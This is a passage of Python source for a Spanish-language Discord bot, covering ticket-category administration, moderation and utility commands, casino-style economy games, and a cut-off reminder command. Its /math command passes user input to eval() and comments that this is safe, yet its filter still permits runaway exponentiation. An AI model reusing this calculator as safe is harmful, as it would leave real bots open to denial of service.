class TicketCategoryMenuView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.select(
        placeholder="Selecciona una acción para categorías de tickets...",
        options=[
            discord.SelectOption(
                label="➕ Añadir Nueva Categoría",
                description="Crear una nueva categoría de ticket",
                emoji="➕",
                value="add_category"),
            discord.SelectOption(label="📋 Ver Categorías Actuales",
                                 description="Mostrar todas las categorías",
                                 emoji="📋",
                                 value="view_categories"),
            discord.SelectOption(label="✏️ Editar Categoría",
                                 description="Modificar categoría existente",
                                 emoji="✏️",
                                 value="edit_category"),
            discord.SelectOption(label="🗑️ Eliminar Categoría",
                                 description="Remover categoría existente",
                                 emoji="🗑️",
                                 value="remove_category"),
            discord.SelectOption(label="🔙 Volver al Panel Principal",
                                 description="Regresar al menú de tickets",
                                 emoji="🔙",
                                 value="back")
        ])
    async def select_ticket_action(self, interaction: discord.Interaction,
                                   select: discord.ui.Select):
        selected = select.values[0]

        if selected == "back":
            view = TicketsMenuView()
            embed = discord.Embed(
                title="🎫 Tickets - Panel Administrativo",
                description="Selecciona una acción del menú:",
                color=discord.Color.blue())
            await interaction.response.edit_message(embed=embed, view=view)
            return

        if selected == "add_category":
            embed = discord.Embed(
                title="➕ Añadir Nueva Categoría",
                description="Para añadir una nueva categoría de ticket, usa:\n\n"
                "**Comando:** `/tadd <nombre> <descripción> [color] [categoría_canal]`\n\n"
                "**Ejemplos:**\n"
                "`/tadd \"Soporte Técnico\" \"Problemas técnicos\" blue`\n"
                "`/tadd \"Reportes\" \"Reportar bugs\" red`\n"
                "`/tadd \"Sugerencias\" \"Ideas y mejoras\" green`\n\n"
                "**Colores disponibles:** blue, red, green, gray, purple",
                color=discord.Color.green())
        elif selected == "view_categories":
            await self.show_current_categories(interaction)
            return
        elif selected == "edit_category":
            embed = discord.Embed(
                title="✏️ Editar Categoría",
                description="Para editar una categoría existente, usa:\n\n"
                "**Comando:** `/tedit <id_categoría> [nuevo_nombre] [nueva_descripción] [nuevo_color]`\n\n"
                "**Ejemplo:**\n"
                "`/tedit soporte \"Soporte Premium\" \"Soporte prioritario\" gold`",
                color=discord.Color.orange())
        elif selected == "remove_category":
            embed = discord.Embed(
                title="🗑️ Eliminar Categoría",
                description="Para eliminar una categoría, usa:\n\n"
                "**Comando:** `/tremove <id_categoría>`\n\n"
                "**Ejemplo:**\n"
                "`/tremove bugs`\n\n"
                "⚠️ **Nota:** No puedes eliminar las categorías básicas (general, bugs, suggestions, other)",
                color=discord.Color.red())

        await interaction.response.edit_message(embed=embed, view=self)

    async def show_current_categories(self, interaction):
        guild_id = str(interaction.guild.id)
        categories = get_guild_categories(guild_id)

        embed = discord.Embed(
            title="📋 Categorías de Tickets Actuales",
            description="Lista de todas las categorías configuradas:",
            color=discord.Color.blue())

        for cat_id, cat_data in categories.items():
            embed.add_field(name=f"🎫 {cat_data['name']}",
                            value=f"**ID:** `{cat_id}`\n"
                            f"**Descripción:** {cat_data['description']}\n"
                            f"**Color:** {cat_data['color']}",
                            inline=False)

        embed.set_footer(text=f"Total: {len(categories)} categorías")
        await interaction.response.edit_message(embed=embed, view=self)


class TicketAdminMenuView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.select(
        placeholder="Selecciona una acción de tickets...",
        options=[
            discord.SelectOption(
                label="🎫 Configurar Panel de Tickets",
                description="Crear panel interactivo en el canal",
                emoji="🎫",
                value="setup_panel"),
            discord.SelectOption(
                label="📋 Gestionar Categorías",
                description="Añadir, editar o eliminar categorías",
                emoji="📋",
                value="manage_categories"),
            discord.SelectOption(
                label="❌ Cerrar Todos los Tickets",
                description="Cerrar todos los tickets abiertos",
                emoji="❌",
                value="close_all"),
            discord.SelectOption(
                label="📊 Estadísticas de Tickets",
                description="Ver estadísticas y datos del sistema",
                emoji="📊",
                value="ticket_stats"),
            discord.SelectOption(label="🔧 Configuración Avanzada",
                                 description="Opciones avanzadas de tickets",
                                 emoji="🔧",
                                 value="advanced_config")
        ])
    async def select_ticket_action(self, interaction: discord.Interaction,
                                   select: discord.ui.Select):
        selected = select.values[0]

        if selected == "setup_panel":
            await self.setup_panel(interaction)
        elif selected == "manage_categories":
            view = TicketCategoryMenuView()
            embed = discord.Embed(
                title="📋 Gestión de Categorías de Tickets",
                description=
                "Selecciona qué acción realizar con las categorías:",
                color=discord.Color.purple())
            await interaction.response.edit_message(embed=embed, view=view)
        elif selected == "close_all":
            await self.close_all_tickets(interaction)
        elif selected == "ticket_stats":
            await self.show_ticket_stats(interaction)
        elif selected == "advanced_config":
            await self.show_advanced_config(interaction)

    async def setup_panel(self, interaction):
        guild = interaction.guild
        categories = get_guild_categories(guild.id)
        active_count = len(
            [ch for ch in guild.channels if ch.name.startswith('ticket-')])

        # Crear el panel de tickets directamente
        categories_text = "\n".join(
            [f"• {cat['name']}" for cat in categories.values()][:5])
        if len(categories) > 5:
            categories_text += f"\n• Y {len(categories) - 5} más..."

        embed = discord.Embed(
            title="🎫 Sistema de Tickets de Soporte",
            description=
            "**¿Necesitas ayuda?** Selecciona una categoría abajo para crear tu ticket.\n\n"
            "🔹 **¿Para qué usar los tickets?**\n"
            "• Reportar problemas\n"
            "• Solicitar ayuda\n"
            "• Consultas privadas\n"
            "• Sugerencias\n\n"
            "⏱️ **Tiempo de respuesta promedio:** 1-24 horas",
            color=discord.Color.blue())

        embed.add_field(name="🎫 Tickets Activos",
                        value=f"**{active_count}** tickets abiertos",
                        inline=True)

        embed.add_field(name="📋 Categorías Disponibles",
                        value=categories_text,
                        inline=True)

        embed.set_footer(
            text=
            "Selecciona una categoría para crear tu ticket • Panel actualizado automáticamente"
        )

        view = TicketView(guild.id)

        # Enviar el panel al canal actual
        await interaction.channel.send(embed=embed, view=view)

        # Confirmar la creación
        confirm_embed = discord.Embed(
            title="✅ Panel de Tickets Creado",
            description=
            f"Se ha creado el panel de tickets en {interaction.channel.mention} exitosamente.\n\n"
            f"📊 **Estadísticas:**\n"
            f"• {len(categories)} categorías configuradas\n"
            f"• {active_count} tickets activos\n"
            f"• Panel interactivo con botones dinámicos",
            color=discord.Color.green())
        await interaction.response.edit_message(embed=confirm_embed, view=self)

    async def close_all_tickets(self, interaction):
        guild = interaction.guild
        tickets_closed = 0

        for channel in guild.channels:
            if channel.name.startswith('ticket-'):
                try:
                    await channel.delete()
                    tickets_closed += 1
                except:
                    pass

        active_tickets.clear()

        embed = discord.Embed(
            title="❌ Tickets Cerrados Masivamente",
            description=
            f"Se cerraron **{tickets_closed}** tickets exitosamente.\n\n"
            f"🔄 **Acción completada:**\n"
            f"• Todos los canales de tickets eliminados\n"
            f"• Registro de tickets activos limpiado\n"
            f"• Sistema listo para nuevos tickets",
            color=discord.Color.orange())
        await interaction.response.edit_message(embed=embed, view=self)

    async def show_ticket_stats(self, interaction):
        guild = interaction.guild
        active_tickets_count = len(
            [ch for ch in guild.channels if ch.name.startswith('ticket-')])
        total_categories = len(get_guild_categories(guild.id))

        embed = discord.Embed(
            title="📊 Estadísticas Completas de Tickets",
            description=f"**Análisis del sistema de tickets en {guild.name}**",
            color=discord.Color.green())

        embed.add_field(name="🎫 Tickets Activos",
                        value=f"**{active_tickets_count}** tickets abiertos",
                        inline=True)
        embed.add_field(name="📋 Categorías",
                        value=f"**{total_categories}** configuradas",
                        inline=True)
        embed.add_field(name="🏛️ Servidor", value=guild.name, inline=True)

        # Desglose por categorías
        categories = get_guild_categories(guild.id)
        if categories:
            cat_list = []
            for cat_id, cat_data in list(categories.items())[:5]:
                cat_list.append(f"• {cat_data['name']}")

            embed.add_field(name="📂 Categorías Principales",
                            value="\n".join(cat_list) +
                            (f"\n• Y {len(categories) - 5} más..."
                             if len(categories) > 5 else ""),
                            inline=False)

        # Mostrar tickets activos si hay
        if active_tickets_count > 0:
            active_list = []
            for channel in guild.channels:
                if channel.name.startswith('ticket-') and len(active_list) < 5:
                    active_list.append(f"• {channel.mention}")

            if active_list:
                embed.add_field(
                    name="🎫 Tickets Abiertos",
                    value="\n".join(active_list) +
                    (f"\n• Y {active_tickets_count - len(active_list)} más"
                     if active_tickets_count > 5 else ""),
                    inline=False)
        else:
            embed.add_field(name="✅ Estado",
                            value="No hay tickets abiertos actualmente",
                            inline=False)

        embed.set_footer(text="Sistema de tickets funcionando correctamente")
        await interaction.response.edit_message(embed=embed, view=self)

    async def show_advanced_config(self, interaction):
        embed = discord.Embed(
            title="🔧 Configuración Avanzada de Tickets",
            description="**Opciones avanzadas para administradores**\n\n"
            "Herramientas adicionales para gestionar el sistema de tickets:",
            color=discord.Color.purple())

        embed.add_field(
            name="📝 Comandos de Gestión",
            value="`/tadd <nombre> <descripción>` - Añadir categoría\n"
            "`/tedit <id> [opciones]` - Editar categoría\n"
            "`/tremove <id>` - Eliminar categoría\n"
            "`/close` - Cerrar ticket actual",
            inline=False)

        embed.add_field(
            name="⚙️ Características Avanzadas",
            value="• Categorías dinámicas con colores personalizados\n"
            "• Botones automáticos por categoría\n"
            "• Sistema de permisos automático\n"
            "• Contadores en tiempo real\n"
            "• Log automático de acciones",
            inline=False)

        embed.add_field(
            name="🛡️ Seguridad",
            value="• Solo moderadores pueden gestionar categorías\n"
            "• Solo creadores y staff pueden cerrar tickets\n"
            "• Permisos automáticos por canal\n"
            "• Protección contra spam de tickets",
            inline=False)

        embed.set_footer(text="Configuración avanzada • Solo administradores")
        await interaction.response.edit_message(embed=embed, view=self)


@bot.tree.command(name="tadd", description="Añadir nueva categoría de ticket")
@discord.app_commands.describe(
    name="Nombre de la categoría",
    description="Descripción de la categoría",
    color="Color (blue, red, green, etc.)",
    category="Categoría de canal donde crear los tickets (opcional)")
async def ticket_add_category(interaction: discord.Interaction,
                              name: str,
                              description: str,
                              color: str = "blue",
                              category: discord.CategoryChannel = None):
    if not interaction.user.guild_permissions.manage_channels:
        await interaction.response.send_message(
            "❌ Necesitas permisos de **Administrar Canales**.", ephemeral=True)
        return

    guild_id = str(interaction.guild.id)
    categories = get_guild_categories(guild_id)

    # Generar ID único para la categoría
    category_id = name.lower().replace(" ", "_")

    if category_id in categories:
        await interaction.response.send_message(
            f"❌ Ya existe una categoría con el nombre '{name}'.",
            ephemeral=True)
        return

    # Verificar permisos en la categoría si se especificó
    if category and not category.permissions_for(
            interaction.guild.me).manage_channels:
        await interaction.response.send_message(
            f"❌ No tengo permisos para crear canales en la categoría {category.name}.",
            ephemeral=True)
        return

    categories[category_id] = {
        "name": f"🎫 {name}",
        "color": color,
        "description": description,
        "category_id": category.id if category else None
    }

    save_ticket_categories()

    embed = discord.Embed(
        title="✅ Categoría Añadida",
        description=f"Se ha añadido la categoría **{name}** exitosamente.",
        color=discord.Color.green())
    embed.add_field(name="📝 Descripción", value=description, inline=False)
    embed.add_field(name="🎨 Color", value=color, inline=True)

    if category:
        embed.add_field(name="📁 Categoría de canal",
                        value=category.name,
                        inline=True)
    else:
        embed.add_field(name="📁 Categoría de canal",
                        value="Sin categoría específica",
                        inline=True)

    await interaction.response.send_message(embed=embed)

    # Actualizar todos los paneles de tickets
    try:
        await update_all_ticket_panels(interaction.guild)
    except Exception as e:
        print(f"Error actualizando paneles tras añadir categoría: {e}")


@bot.tree.command(name="tedit",
                  description="Editar categoría de ticket existente")
@discord.app_commands.describe(category_id="ID de la categoría a editar",
                               name="Nuevo nombre (opcional)",
                               description="Nueva descripción (opcional)",
                               color="Nuevo color (opcional)")
async def ticket_edit_category(interaction: discord.Interaction,
                               category_id: str,
                               name: str = None,
                               description: str = None,
                               color: str = None):
    if not interaction.user.guild_permissions.manage_channels:
        await interaction.response.send_message(
            "❌ Necesitas permisos de **Administrar Canales**.", ephemeral=True)
        return

    guild_id = str(interaction.guild.id)
    categories = get_guild_categories(guild_id)

    if category_id not in categories:
        await interaction.response.send_message(
            f"❌ No existe una categoría con ID '{category_id}'.",
            ephemeral=True)
        return

    category = categories[category_id]

    if name:
        category["name"] = f"🎫 {name}"
    if description:
        category["description"] = description
    if color:
        category["color"] = color

    save_ticket_categories()

    embed = discord.Embed(
        title="✅ Categoría Editada",
        description=
        f"Se ha editado la categoría **{category_id}** exitosamente.",
        color=discord.Color.blue())
    embed.add_field(name="📛 Nombre", value=category["name"], inline=True)
    embed.add_field(name="📝 Descripción",
                    value=category["description"],
                    inline=False)
    embed.add_field(name="🎨 Color", value=category["color"], inline=True)

    await interaction.response.send_message(embed=embed)

    # Actualizar todos los paneles de tickets
    try:
        await update_all_ticket_panels(interaction.guild)
    except Exception as e:
        print(f"Error actualizando paneles tras editar categoría: {e}")


@bot.tree.command(name="tremove", description="Eliminar categoría de ticket")
@discord.app_commands.describe(category_id="ID de la categoría a eliminar")
async def ticket_remove_category(interaction: discord.Interaction,
                                 category_id: str):
    if not interaction.user.guild_permissions.manage_channels:
        await interaction.response.send_message(
            "❌ Necesitas permisos de **Administrar Canales**.", ephemeral=True)
        return

    guild_id = str(interaction.guild.id)
    categories = get_guild_categories(guild_id)

    if category_id not in categories:
        await interaction.response.send_message(
            f"❌ No existe una categoría con ID '{category_id}'.",
            ephemeral=True)
        return

    # No permitir eliminar categorías básicas
    if category_id in ["general", "bugs", "suggestions", "other"]:
        await interaction.response.send_message(
            f"❌ No puedes eliminar la categoría básica '{category_id}'.",
            ephemeral=True)
        return

    category_name = categories[category_id]["name"]
    del categories[category_id]
    save_ticket_categories()

    embed = discord.Embed(
        title="✅ Categoría Eliminada",
        description=
        f"Se ha eliminado la categoría **{category_name}** exitosamente.",
        color=discord.Color.red())

    await interaction.response.send_message(embed=embed)

    # Actualizar todos los paneles de tickets
    try:
        await update_all_ticket_panels(interaction.guild)
    except Exception as e:
        print(f"Error actualizando paneles tras eliminar categoría: {e}")


@bot.tree.command(
    name='tadmin',
    description='Panel administrativo de tickets con menú de selección')
async def ticket_admin_menu(interaction: discord.Interaction):
    """Panel administrativo completo de tickets con menús de selección"""
    # Verificar permisos
    if not interaction.user.guild_permissions.manage_channels:
        await interaction.response.send_message(
            "❌ Necesitas permisos de **Administrar Canales**.", ephemeral=True)
        return

    # Obtener estadísticas
    guild = interaction.guild
    active_tickets_count = len(
        [ch for ch in guild.channels if ch.name.startswith('ticket-')])
    total_categories = len(get_guild_categories(guild.id))

    # Crear menú administrativo de tickets
    embed = discord.Embed(
        title="🎫 Panel Administrativo de Tickets",
        description="**Sistema completo de gestión de tickets**\n\n"
        f"🔹 **Estado actual:**\n"
        f"• **{active_tickets_count}** tickets activos\n"
        f"• **{total_categories}** categorías configuradas\n"
        f"• Servidor: **{guild.name}**\n\n"
        "📋 **Selecciona una acción del menú desplegable:**\n"
        "🎫 **Configurar Panel** - Crear panel interactivo\n"
        "📋 **Gestionar Categorías** - Añadir, editar, eliminar\n"
        "❌ **Cerrar Todos** - Cerrar tickets masivamente\n"
        "📊 **Estadísticas** - Ver datos completos\n"
        "🔧 **Configuración** - Opciones avanzadas",
        color=discord.Color.purple())
    embed.set_footer(
        text="Panel administrativo interactivo • Solo administradores")
    embed.set_thumbnail(
        url="https://cdn-icons-png.flaticon.com/512/1828/1828535.png")

    view = TicketAdminMenuView()
    await interaction.response.send_message(embed=embed,
                                            view=view,
                                            ephemeral=True)


# ================================
# COMANDOS DE UTILIDAD ADICIONALES
# ================================


@bot.tree.command(name='clear', description='Eliminar mensajes del canal')
@discord.app_commands.describe(amount="Número de mensajes a eliminar (1-100)")
async def clear_messages(interaction: discord.Interaction, amount: int):
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message(
            "❌ Necesitas permisos de **Administrar Mensajes**.",
            ephemeral=True)
        return

    if amount < 1 or amount > 100:
        await interaction.response.send_message(
            "❌ Puedes eliminar entre 1 y 100 mensajes.", ephemeral=True)
        return

    await interaction.response.defer()

    try:
        deleted = await interaction.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🗑️ Mensajes Eliminados",
            description=f"Se eliminaron **{len(deleted)}** mensajes.",
            color=discord.Color.green())
        await interaction.followup.send(embed=embed, delete_after=10)
    except Exception as e:
        await interaction.response.send_message(
            f"❌ Error al eliminar mensajes: {str(e)}", ephemeral=True)


@bot.tree.command(name='userinfo', description='Ver información de un usuario')
@discord.app_commands.describe(user="Usuario del que ver la información")
async def user_info(interaction: discord.Interaction,
                    user: discord.Member = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    target = user or interaction.user

    embed = discord.Embed(title=f"👤 Información de {target.display_name}",
                          color=target.color if target.color
                          != discord.Color.default() else discord.Color.blue())
    embed.set_thumbnail(url=target.display_avatar.url)

    # Información básica
    embed.add_field(name="📛 Nombre",
                    value=f"{target.name}#{target.discriminator}",
                    inline=True)
    embed.add_field(name="🆔 ID", value=target.id, inline=True)
    embed.add_field(name="🤖 Bot",
                    value="✅" if target.bot else "❌",
                    inline=True)

    # Fechas
    embed.add_field(name="📅 Cuenta creada",
                    value=f"<t:{int(target.created_at.timestamp())}:R>",
                    inline=True)
    embed.add_field(name="📥 Se unió al servidor",
                    value=f"<t:{int(target.joined_at.timestamp())}:R>",
                    inline=True)

    # Roles
    roles = [role.mention for role in target.roles[1:]]  # Excluir @everyone
    embed.add_field(name=f"🏷️ Roles ({len(roles)})",
                    value=" ".join(roles[:5]) +
                    (f" y {len(roles)-5} más..." if len(roles) > 5 else "")
                    if roles else "Ninguno",
                    inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='poll', description='Crear una encuesta')
@discord.app_commands.describe(question="Pregunta de la encuesta",
                               option1="Primera opción",
                               option2="Segunda opción",
                               option3="Tercera opción (opcional)",
                               option4="Cuarta opción (opcional)")
async def create_poll(interaction: discord.Interaction,
                      question: str,
                      option1: str,
                      option2: str,
                      option3: str = None,
                      option4: str = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    options = [option1, option2]
    if option3: options.append(option3)
    if option4: options.append(option4)

    embed = discord.Embed(title="📊 Encuesta",
                          description=f"**{question}**",
                          color=discord.Color.blue())

    reactions = ['1️⃣', '2️⃣', '3️⃣', '4️⃣']
    description = ""
    for i, option in enumerate(options):
        description += f"\n{reactions[i]} {option}"

    embed.add_field(name="Opciones:", value=description, inline=False)
    embed.set_footer(
        text=f"Encuesta creada por {interaction.user.display_name}")

    await interaction.response.send_message(embed=embed)
    message = await interaction.original_response()

    # Añadir reacciones
    for i in range(len(options)):
        await message.add_reaction(reactions[i])


@bot.command(name='coinflip', aliases=['cf'])
async def coinflip_command(ctx, bet: int = None):
    """Juego de cara o cruz con apuestas"""
    if not bet:
        await ctx.send(
            "❌ Uso: `.coinflip cantidad`\n**Ejemplo:** `.coinflip 1000`")
        return

    if bet <= 0:
        await ctx.send("❌ La apuesta debe ser mayor a 0.")
        return

    user_balance = get_balance(ctx.author.id)
    if user_balance['wallet'] < bet:
        await ctx.send(
            f"❌ No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}"
        )
        return

    # Cobrar la apuesta
    update_balance(ctx.author.id, -bet, 0)

    # Lanzar moneda
    result = random.choice(["cara", "cruz"])
    user_choice = random.choice(["cara",
                                 "cruz"])  # Simular elección del usuario

    if result == user_choice:
        # Ganó - devolver apuesta + ganancia
        winnings = bet * 2
        update_balance(ctx.author.id, winnings, 0)

        embed = discord.Embed(title="🪙 Coinflip - ¡GANASTE!",
                              color=discord.Color.green())
        embed.add_field(name="🎯 Resultado", value=result.upper(), inline=True)
        embed.add_field(name="💰 Apostaste", value=f"${bet:,}", inline=True)
        embed.add_field(name="🏆 Ganaste", value=f"${winnings:,}", inline=True)
    else:
        # Perdió
        embed = discord.Embed(title="🪙 Coinflip - Perdiste",
                              color=discord.Color.red())
        embed.add_field(name="🎯 Resultado", value=result.upper(), inline=True)
        embed.add_field(name="💸 Perdiste", value=f"${bet:,}", inline=True)
        embed.add_field(name="🍀 Suerte",
                        value="¡Inténtalo de nuevo!",
                        inline=True)

    await ctx.send(embed=embed)


@bot.command(name='slots', aliases=['sl'])
async def slots_command(ctx, bet: int = None):
    """Máquina tragamonedas"""
    if not bet:
        await ctx.send("❌ Uso: `.slots cantidad`\n**Ejemplo:** `.slots 500`")
        return

    if bet <= 0:
        await ctx.send("❌ La apuesta debe ser mayor a 0.")
        return

    user_balance = get_balance(ctx.author.id)
    if user_balance['wallet'] < bet:
        await ctx.send(
            f"❌ No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}"
        )
        return

    # Cobrar la apuesta
    update_balance(ctx.author.id, -bet, 0)

    # Símbolos de la máquina
    symbols = ["🍒", "🍋", "🍊", "🍇", "🔔", "💎", "7️⃣"]

    # Generar resultado
    slot1 = random.choice(symbols)
    slot2 = random.choice(symbols)
    slot3 = random.choice(symbols)

    # Calcular ganancia
    winnings = 0

    if slot1 == slot2 == slot3:
        if slot1 == "💎":
            winnings = bet * 10  # Jackpot
        elif slot1 == "7️⃣":
            winnings = bet * 8
        elif slot1 == "🔔":
            winnings = bet * 6
        else:
            winnings = bet * 4
    elif slot1 == slot2 or slot2 == slot3 or slot1 == slot3:
        winnings = bet * 2  # Par

    if winnings > 0:
        update_balance(ctx.author.id, winnings, 0)
        embed = discord.Embed(title="🎰 Slots - ¡GANASTE!",
                              color=discord.Color.gold())
        embed.add_field(name="🎲 Resultado",
                        value=f"{slot1} {slot2} {slot3}",
                        inline=False)
        embed.add_field(name="💰 Apostaste", value=f"${bet:,}", inline=True)
        embed.add_field(name="🏆 Ganaste", value=f"${winnings:,}", inline=True)

        if slot1 == slot2 == slot3 == "💎":
            embed.add_field(name="🎉 ¡JACKPOT!", value="💎💎💎", inline=False)
    else:
        embed = discord.Embed(title="🎰 Slots - Sin suerte",
                              color=discord.Color.red())
        embed.add_field(name="🎲 Resultado",
                        value=f"{slot1} {slot2} {slot3}",
                        inline=False)
        embed.add_field(name="💸 Perdiste", value=f"${bet:,}", inline=True)
        embed.add_field(name="🍀 Suerte",
                        value="¡Inténtalo de nuevo!",
                        inline=True)

    await ctx.send(embed=embed)


@bot.command(name='blackjack', aliases=['bj'])
async def blackjack_command(ctx, bet: int = None):
    """Juego de Blackjack simplificado"""
    if not bet:
        await ctx.send(
            "❌ Uso: `.blackjack cantidad`\n**Ejemplo:** `.blackjack 1000`")
        return

    if bet <= 0:
        await ctx.send("❌ La apuesta debe ser mayor a 0.")
        return

    user_balance = get_balance(ctx.author.id)
    if user_balance['wallet'] < bet:
        await ctx.send(
            f"❌ No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}"
        )
        return

    # Cobrar la apuesta
    update_balance(ctx.author.id, -bet, 0)

    # Generar cartas (simplificado)
    def get_card_value():
        return random.randint(1, 11)

    def get_hand_total(cards):
        total = sum(cards)
        # Ajustar Ases si es necesario
        aces = cards.count(11)
        while total > 21 and aces:
            total -= 10
            aces -= 1
        return total

    # Repartir cartas iniciales
    player_cards = [get_card_value(), get_card_value()]
    dealer_cards = [get_card_value(), get_card_value()]

    player_total = get_hand_total(player_cards)
    dealer_total = get_hand_total(dealer_cards)

    # Lógica simplificada del dealer
    while dealer_total < 17:
        dealer_cards.append(get_card_value())
        dealer_total = get_hand_total(dealer_cards)

    # Determinar ganador
    winnings = 0
    result = ""

    if player_total > 21:
        result = "Te pasaste de 21"
    elif dealer_total > 21:
        result = "El dealer se pasó"
        winnings = bet * 2
    elif player_total == 21 and len(player_cards) == 2:
        result = "¡BLACKJACK!"
        winnings = int(bet * 2.5)
    elif player_total > dealer_total:
        result = "¡Ganaste!"
        winnings = bet * 2
    elif player_total == dealer_total:
        result = "Empate"
        winnings = bet  # Devolver apuesta
    else:
        result = "Perdiste"

    if winnings > 0:
        update_balance(ctx.author.id, winnings, 0)

    # Crear embed
    if winnings > bet:
        embed = discord.Embed(title="♠️ Blackjack - ¡GANASTE!",
                              color=discord.Color.green())
    elif winnings == bet:
        embed = discord.Embed(title="♠️ Blackjack - Empate",
                              color=discord.Color.orange())
    else:
        embed = discord.Embed(title="♠️ Blackjack - Perdiste",
                              color=discord.Color.red())

    embed.add_field(name="🃏 Tus cartas",
                    value=f"Total: {player_total}",
                    inline=True)
    embed.add_field(name="🎰 Dealer",
                    value=f"Total: {dealer_total}",
                    inline=True)
    embed.add_field(name="🎯 Resultado", value=result, inline=False)
    embed.add_field(name="💰 Apostaste", value=f"${bet:,}", inline=True)

    if winnings > 0:
        embed.add_field(name="🏆 Recibiste",
                        value=f"${winnings:,}",
                        inline=True)

    await ctx.send(embed=embed)


# ================================
# COMANDOS DE DIVERSIÓN ADICIONALES
# ================================


@bot.tree.command(name='meme', description='Obtener un meme aleatorio')
async def get_meme(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    memes = [
        "https://i.imgur.com/XyLOD.jpg", "https://i.imgur.com/fPUUf.jpg",
        "https://i.imgur.com/dQaJk.jpg"
    ]

    embed = discord.Embed(title="😂 Meme Aleatorio",
                          color=discord.Color.random())
    embed.set_image(url=random.choice(memes))

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='8ball', description='Pregunta a la bola mágica')
@discord.app_commands.describe(question="Tu pregunta")
async def eight_ball(interaction: discord.Interaction, question: str):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    responses = [
        "🎱 Es cierto.", "🎱 Es decididamente así.", "🎱 Sin duda.",
        "🎱 Sí, definitivamente.", "🎱 Puedes confiar en ello.",
        "🎱 Como yo lo veo, sí.", "🎱 Muy probable.",
        "🎱 Las perspectivas son buenas.", "🎱 Sí.",
        "🎱 Las señales apuntan a que sí.",
        "🎱 Respuesta confusa, intenta de nuevo.",
        "🎱 Pregunta de nuevo más tarde.", "🎱 Mejor no te lo digo ahora.",
        "🎱 No puedo predecirlo ahora.", "🎱 Concéntrate y pregunta de nuevo.",
        "🎱 No cuentes con ello.", "🎱 Mi respuesta es no.",
        "🎱 Mis fuentes dicen que no.", "🎱 Las perspectivas no son tan buenas.",
        "🎱 Muy dudoso."
    ]

    embed = discord.Embed(
        title="🎱 Bola Mágica",
        description=
        f"**Pregunta:** {question}\n\n**Respuesta:** {random.choice(responses)}",
        color=discord.Color.purple())

    await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE UTILIDAD ADICIONALES
# ================================


@bot.tree.command(name='avatar', description='Ver el avatar de un usuario')
@discord.app_commands.describe(user="Usuario del que ver el avatar")
async def avatar_command(interaction: discord.Interaction,
                         user: discord.Member = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    target = user or interaction.user

    embed = discord.Embed(title=f"🖼️ Avatar de {target.display_name}",
                          color=target.color if target.color
                          != discord.Color.default() else discord.Color.blue())

    embed.set_image(url=target.display_avatar.url)
    embed.add_field(name="🔗 Enlace directo",
                    value=f"[Descargar]({target.display_avatar.url})",
                    inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='math', description='Calculadora básica')
@discord.app_commands.describe(
    expression="Expresión matemática (ej: 2+2, 10*5, sqrt(16))")
async def math_command(interaction: discord.Interaction, expression: str):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    try:
        # Reemplazar funciones comunes
        expression = expression.replace("sqrt", "**0.5")
        expression = expression.replace("^", "**")

        # Evaluación segura solo con operadores matemáticos básicos
        allowed_chars = "0123456789+-*/.() "
        if all(c in allowed_chars for c in expression):
            result = eval(expression)

            embed = discord.Embed(title="🔢 Calculadora",
                                  color=discord.Color.green())
            embed.add_field(name="📝 Expresión",
                            value=f"`{expression}`",
                            inline=False)
            embed.add_field(name="✅ Resultado",
                            value=f"`{result}`",
                            inline=False)

            await interaction.response.send_message(embed=embed)
        else:
            await interaction.response.send_message(
                "❌ Solo se permiten números y operadores matemáticos básicos (+, -, *, /, (), sqrt)",
                ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(
            f"❌ Error en la expresión matemática: {str(e)}", ephemeral=True)


@bot.tree.command(name='weather',
                  description='Información meteorológica simulada')
@discord.app_commands.describe(city="Ciudad (simulación)")
async def weather_command(interaction: discord.Interaction, city: str):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Simulación de datos meteorológicos
    temperatures = list(range(-5, 35))
    conditions = [
        "☀️ Soleado", "⛅ Parcialmente nublado", "☁️ Nublado", "🌧️ Lluvioso",
        "⛈️ Tormentoso", "🌨️ Nevando"
    ]

    temp = random.choice(temperatures)
    condition = random.choice(conditions)
    humidity = random.randint(30, 90)
    wind_speed = random.randint(5, 25)

    embed = discord.Embed(title=f"🌤️ Clima en {city.title()}",
                          description=f"**{condition}**",
                          color=discord.Color.blue())

    embed.add_field(name="🌡️ Temperatura", value=f"{temp}°C", inline=True)
    embed.add_field(name="💨 Viento", value=f"{wind_speed} km/h", inline=True)
    embed.add_field(name="💧 Humedad", value=f"{humidity}%", inline=True)
    embed.set_footer(text="⚠️ Datos simulados - No reales")

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='reminder', description='Crear un recordatorio')
@discord.app_commands.describe(time="Tiempo en minutos",
                               message="Mensaje del recordatorio")
async def reminder_command(interaction: discord.Interaction, time: int,
                           message: str):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if time <= 0 or time > 1440:  # Máximo 24 horas
        await interaction.response.send_message(
